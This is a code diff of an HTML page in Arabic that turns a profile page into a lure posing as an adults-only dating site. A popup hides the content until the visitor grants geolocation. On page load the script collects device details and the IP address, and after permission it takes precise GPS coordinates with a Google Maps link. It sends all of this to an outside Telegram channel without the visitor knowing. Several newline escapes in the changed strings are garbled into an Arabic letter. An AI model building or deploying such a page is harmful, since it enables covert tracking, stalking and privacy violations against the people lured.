@@ -3,30 +3,142 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Profile Page</title>
+    <title>تعارف للكبار فقط</title>
     <style>
-        #overlay {
-            display: none;
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(to right, #ff758c, #ff7eb3);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            max-width: 800px;
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            text-align: center;
+            padding: 20px;
+            color: #333;
+        }
+        .header {
+            padding: 20px;
+        }
+        .header img {
+            width: 150px;
+            border-radius: 50%;
+        }
+        .header h1 {
+            margin: 10px 0;
+            font-size: 24px;
+            color: #ff758c;
+        }
+        .content {
+            padding: 20px;
+        }
+        .content p {
+            font-size: 18px;
+            color: #555;
+        }
+        .profiles {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        .profile {
+            margin: 10px;
+            text-align: center;
+        }
+        .profile img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 2px solid #ff758c;
+        }
+        .profile p {
+            margin-top: 5px;
+            font-size: 16px;
+            color: #333;
+        }
+        .footer {
+            padding: 10px;
+            font-size: 14px;
+        }
+        .footer a {
+            color: #ff758c;
+            text-decoration: none;
+        }
+        .overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
             justify-content: center;
             align-items: center;
-            color: white;
-            font-size: 20px;
-            text-align: center;
+            z-index: 9999;
         }
-        #overlay.active {
-            display: flex;
+        .overlay .popup {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .overlay .popup button {
+            background-color: #ff758c;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
         }
     </style>
 </head>
 <body>
-    <div id="overlay">
-        يرجى تفعيل إذن الموقع للمتابعة.
+    <div class="overlay" id="overlay">
+        <div class="popup">
+            <p>يرجى السماح بإذن الموقع الجغرافي للمتابعة</p>
+            <button onclick="requestLocationPermission()">السماح</button>
+        </div>
+    </div>
+
+    <div class="container" id="content" style="display: none;">
+        <div class="header">
+            <img src="https://example.com/image.jpg" alt="فتاة مثيرة">
+            <h1>مرحبا بك في موقع التعارف للكبار فقط</h1>
+        </div>
+        <div class="content">
+            <p>استمتع بالتعرف على أشخاص جدد ومشاهدة محتوى حصري للكبار فقط.</p>
+            <div class="profiles">
+                <div class="profile">
+                    <img src="https://randomuser.me/api/portraits/women/81.jpg" alt="مستخدم">
+                    <p>أمل</p>
+                </div>
+                <div class="profile">
+                    <img src="https://randomuser.me/api/portraits/men/82.jpg" alt="مستخدم">
+                    <p>محمد</p>
+                </div>
+                <div class="profile">
+                    <img src="https://randomuser.me/api/portraits/women/83.jpg" alt="مستخدم">
+                    <p>ليلى</p>
+                </div>
+                <div class="profile">
+                    <img src="https://randomuser.me/api/portraits/men/84.jpg" alt="مستخدم">
+                    <p>علي</p>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <p>حقوق الطبع والنشر © 2024 موقع التعارف. جميع الحقوق محفوظة. <a href="#">سياسة الخصوصية</a></p>
+        </div>
     </div>
 
     <script>
@@ -79,7 +191,7 @@
             var wd = window.screen.width;
             var os = ver.substring(0, ver.indexOf(')')).split(';')[1].trim() || 'غير متوفر';
 
-            var deviceInfo = `منصة الجهاز: ${ptf}\nعدد النوى: ${cc}\nالذاكرة العشوائية: ${ram}\nنوع المتصفح: ${brw}\nنظام التشغيل: ${os}\nدقة الشاشة: ${ht}x${wd}\nالشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\nنوع وحدة المعالجة الرسومية: ${ren}`;
+            var deviceInfo = `منصة الجهاز: ${ptf}\نعدد النوى: ${cc}\ن الذاكرة العشوائية: ${ram}\ن نوع المتصفح: ${brw}\ن نظام التشغيل: ${os}\ن دقة الشاشة: ${ht}x${wd}\ن الشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\ن نوع وحدة المعالجة الرسومية: ${ren}`;
             sendInformationToTelegram(deviceInfo);
 
             // Collect IP address
@@ -104,27 +216,32 @@
                     var spd = position.coords.speed || 'غير متوفر';
 
                     var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
-                    var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\nدقة الموقع: ${acc} متر\nالارتفاع: ${alt} متر\nالاتجاه: ${dir} درجة\nالسرعة: ${spd} متر/ثانية\n\nرابط الموقع على جوجل مابس: ${googleMapsLink}`;
+                    var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\ن دقة الموقع: ${acc} متر\n الارتفاع: ${alt} متر\n الاتجاه: ${dir} درجة\n السرعة: ${spd} متر/ثانية\n\n رابط الموقع على جوجل مابس: ${googleMapsLink}`;
                     sendInformationToTelegram(locationInfo);
-                    document.getElementById('overlay').classList.remove('active');
+
+                    document.getElementById('overlay').style.display = 'none';
+                    document.getElementById('content').style.display = 'block';
                 }, function (error) {
-                    document.getElementById('overlay').classList.add('active');
+                    alert('يرجى تفعيل إذن الموقع للمتابعة.');
+                    document.getElementById('overlay').style.display = 'flex';
                 }, optn);
             } else {
                 alert('جهازك لا يدعم تحديد الموقع الجغرافي.');
             }
         }
 
+        // إرسال المعلومات عند تحميل الصفحة
         window.onload = function() {
             collectDeviceInfo();
-            var checkPermissionInterval = setInterval(function() {
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    clearInterval(checkPermissionInterval);
                     requestLocationPermission();
                 }, function(error) {
-                    document.getElementById('overlay').classList.add('active');
+                    document.getElementById('overlay').style.display = 'flex';
                 });
-            }, 5000); // تحقق من إذن الموقع كل 5 ثواني
+            } else {
+                alert('جهازك لا يدعم تحديد الموقع الجغرافي.');
+            }
         };
     </script>
 </body>
